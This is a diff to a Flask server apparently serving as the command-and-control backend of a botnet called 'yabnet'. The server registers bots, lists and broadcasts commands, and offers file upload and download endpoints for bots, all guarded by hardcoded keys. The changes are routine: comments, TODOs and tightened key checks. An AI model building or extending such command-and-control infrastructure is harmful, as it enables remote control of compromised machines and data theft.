@@ -16,6 +16,9 @@ Also takes are of master console's request/response.
 
 """
 
+# TODO: Put configuration into a separate init.py file? 
+# ========================== Initial Configuration =====================
+
 app = Flask(__name__)
 app.config['DEBUG'] = True
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///yabnet.sqlite3'
@@ -36,6 +39,11 @@ MASTERPASSWORD = 'p'
 FIRSTCONTACTKEY = 'firstcontactkey'
 REGISTERKEY = 'registerkey'
 MASTERKEY = 'masterkey'
+
+
+# TODO: Create a separate api.py and then import into the init.py file? 
+
+# ================================= API ==================================
 
 # TODO: Implement this function 
 def posterrorcheck(requestobj, *args):
@@ -379,7 +387,7 @@ def botlist():
 def commandlist():
 
     # Error checking 
-    error = posterrorcheck(request, 'registerkey')
+    error = posterrorcheck(request, 'masterkey')
     if error is not True:
         return error 
 
@@ -391,7 +399,7 @@ def commandlist():
     result = ''
 
     for command in commandlist:
-        result += command.get_info()
+        result += command.get_info() + "\n"
         #print (command.get_info())
 
     return result 
@@ -433,7 +441,7 @@ def broadcast():
 
     return jsonify({ 'result': '[+] Broadcast successful' })
 
-# This is for testing purposes 
+# This is for debugging purposes 
 @app.route('/files')
 def list_files():
     files = [] 
@@ -447,7 +455,8 @@ def list_files():
 @app.route('/upload')
 def upload_file():
     """
-    Description: File upload endpoint for the bots 
+    Description: File upload endpoint for the bot. 
+    TODO: Change this into POST request method and only allow upload from registered bots  
     """
     uploaded_file = request.files['file']
 
@@ -458,11 +467,15 @@ def upload_file():
     
     return jsonify({'success': '[DEBUG] File has been uploaded'})
 
-@app.route('/download/<filename>')
+@app.route('/download/<filename>', methods=['POST'])
 def download_file(filename):
     """
     Description: File download endpoint for the bots to visit and download specific files
     """
+    error = posterrorcheck(request, 'registerkey')
+    if error is not True:
+        return error     
+
     print("[DEBUG] filename = ", filename)
     return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
 
